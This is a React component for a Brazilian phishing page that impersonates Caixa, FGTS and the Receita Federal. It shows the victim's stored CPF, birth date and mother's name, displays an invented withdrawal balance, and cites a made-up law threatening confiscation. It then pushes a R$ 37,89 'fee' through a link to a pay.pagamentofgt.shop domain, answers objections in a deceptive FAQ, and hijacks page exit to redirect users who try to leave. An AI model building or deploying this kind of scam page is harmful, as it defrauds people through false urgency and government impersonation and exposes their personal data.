import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { IoIosWarning } from "react-icons/io";
// import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import pix from "../assets/pix.png";
import { useNavigate } from "react-router-dom";
import { FaAngleRight } from "react-icons/fa";
import dayjs from "dayjs";
import logobranco from "../assets/unnamed.png";
import receita from "../assets/receita.png";

export function PagamentoTarifa() {
    const navigate = useNavigate(); // Hook de navegação do react-router

    useEffect(() => {
        document.title = "Pagamento da Tarifa - Receita Federal";

        // Evento de saída
        window.onbeforeunload = (event: BeforeUnloadEvent) => {
            event.preventDefault();
            navigate("/backredirect"); // Redireciona para a página /backredirect
        };

        // Limpeza do evento ao desmontar o componente
        return () => {
            window.onbeforeunload = null;
        };
    }, [navigate]);

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: "",
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    const [activeIndex, setActiveIndex] = useState<number | null>(null);
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const totalAmount = 3739.7; // Valor total

    // Função para alternar perguntas
    const toggleQuestion = (index: number) => {
        setActiveIndex(activeIndex === index ? null : index);
    };

    const questions = [
        {
            question: "Por que é cobrado uma taxa de R$ 37,89?",
            answer: "A taxa de R$ 37,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável.",
        },
        {
            question: "Por que vocês não descontam a taxa do meu saque?",
            answer: "Descontar a taxa do saque não é viável devido às políticas financeiras que regem essas transações. Ao manter a taxa separada, asseguramos que o valor total do seu saque permaneça intacto até que você opte por efetuar o pagamento, permitindo mais controle sobre seus recursos.",
        },
        {
            question: "Quais são as formas de pagamento?",
            answer: "Oferecemos diversas opções de pagamento para facilitar sua experiência, incluindo cartões de crédito, débito e transferências bancárias. Assim, você pode escolher a forma que melhor se adapta às suas necessidades e garantir que seu saque seja liberado rapidamente.",
        },
        {
            question: "Como faço para sacar rápido sem esperar as 2 horas?",
            answer: "Para garantir que seu saque seja processado rapidamente, recomendamos que você realize o pagamento da tarifa o mais rápido possível. Assim que o pagamento for confirmado, seu saque será priorizado, permitindo que você receba os fundos em um prazo muito mais curto.",
        },
        {
            question: "Qual a garantia que tenho para efetuar o saque dos valores bloqueados?",
            answer: "A segurança é a nossa prioridade. Todos os processos são realizados dentro das diretrizes da Receita Federal, garantindo que seus valores bloqueados sejam liberados com segurança e em conformidade com as leis vigentes. Você pode confiar que estamos aqui para proteger seus interesses.",
        },
        {
            question: "Como posso acompanhar meu pedido de saque?",
            answer: "Você pode acompanhar seu pedido de saque através do nosso portal. Assim que seu pedido for processado, você receberá atualizações em tempo real sobre o status da sua transação, garantindo que você esteja sempre informado sobre o que está acontecendo com seus fundos.",
        },
    ];

    // Animação do valor
    useEffect(() => {
        let start = 0;
        const end = totalAmount;
        const duration = 3000; // Duração da animação em milissegundos (3 segundos)
        const increment = Math.ceil(end / (duration / 100)); // Incremento de valor a cada 100 ms

        const intervalId = setInterval(() => {
            if (start < end) {
                start += increment;
                if (start > end) start = end; // Evitar ultrapassar o valor total
                setDisplayedAmount(start);
            } else {
                clearInterval(intervalId);
            }
        }, 100); // Atualiza a cada 100 ms

        return () => clearInterval(intervalId);
    }, [totalAmount]);

    return (
        <div className="flex flex-col items-center justify-center w-full min-h-screen bg-white pb-8">
            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-4 bg-[#025bab] text-white mb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="px-4">
                <div className="flex flex-col items-center w-full max-w-lg px-2 bg-white shadow-lg rounded-lg space-y-6">
                    <div className="w-full flex justify-center items-center">
                        <div className="flex items-center pt-4 text-primary text-3xl font-bold space-x-4 justify-center">
                            <img src={logobranco} width={70} alt="logo branco" />
                            <span>RENDIMENTO <br /> FGTS 2024</span>
                        </div>
                    </div>

                    <div className="font-bold text-xl flex flex-col px-4 space-y-2">
                        <div className="flex items-center justify-between">
                            <h3>{userData.nome.toUpperCase()}</h3>
                            <FaAngleRight />
                        </div>
                        {userData.nomeMae && (
                            <span className="font-thin text-zinc-500">Nome da mãe: {userData?.nomeMae}</span>
                        )}
                        <span className="font-thin text-zinc-500">CPF: {userData?.cpf}</span>
                        <span className="font-thin text-zinc-500">Nascimento: {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}</span>
                    </div>

                    <div className="flex flex-col text-center">
                        <p className="text-2xl mb-2 text-gray-500 my-2">Valor disponível <br />para saque:</p>
                        <p className="text-6xl font-semibold text-green-500">R$ {displayedAmount.toFixed(2)}</p>
                    </div>

                    <div className="flex items-center pt-4">
                        <IoIosWarning className="text-red-500 mr-2" size={36} />
                        <h2 className="text-3xl font-bold text-red-500">ATENÇÃO!</h2>
                    </div>

                    <h2 className="text-xl text-center text-red-600">
                        Caso não saque o dinheiro hoje, essa quantia será imediatamente bloqueada e disponibilizada ao <span className="font-bold">Tesouro Nacional</span> conforme lei 1.847/24
                    </h2>

                    <img src={receita} alt="receita" width={140} />

                    <div className="text-2xl font-thin text-center text-gray-700 mt-2">
                        <img src="" alt="" />
                        Aguardando pagamento da <span className="text-primary">Tarifa Transacional</span>
                    </div>

                    <div className="text-center space-y-2">
                        <h3 className="text-lg font-thin text-zinc-700">
                            Pague a tarifa para receber seu FGTS em até <span className="text-green-600 font-semibold">3 minutos!</span>
                        </h3>
                        <p className="text-gray-600">70% de desconto no imposto:</p>
                        <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por: </p>
                        <div className="flex justify-center space-x-6">
                            <img src={pix} alt="pix" width={100} />
                            <p className="text-4xl font-extrabold text-green-700">R$ 37,89</p>
                        </div>
                    </div>

                    <a
                        href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y"
                        className="w-full"
                        onClick={() => {
                            window.onbeforeunload = null; // Remove o evento de saída temporariamente
                        }}
                    >
                        <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
                            Realizar Pagamento
                        </button>
                    </a>

                    <div className="flex flex-col w-full border-t border-gray-300 mt-4 pt-2 bg-white">
                        <h3 className="text-lg text-center font-bold">Perguntas Frequentes</h3>
                        {questions.map((item, index) => (
                            <div key={index} className="py-2">
                                <button
                                    className="flex justify-between w-full text-left px-4 py-2 text-gray-800 hover:bg-gray-200"
                                    onClick={() => toggleQuestion(index)}
                                >
                                    <span className="font-bold">{item.question}</span>
                                    <span>{activeIndex === index ? "-" : "+"}</span>
                                </button>
                                {activeIndex === index && (
                                    <div className="px-4 py-2 text-gray-600">{item.answer}</div>
                                )}
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );
}
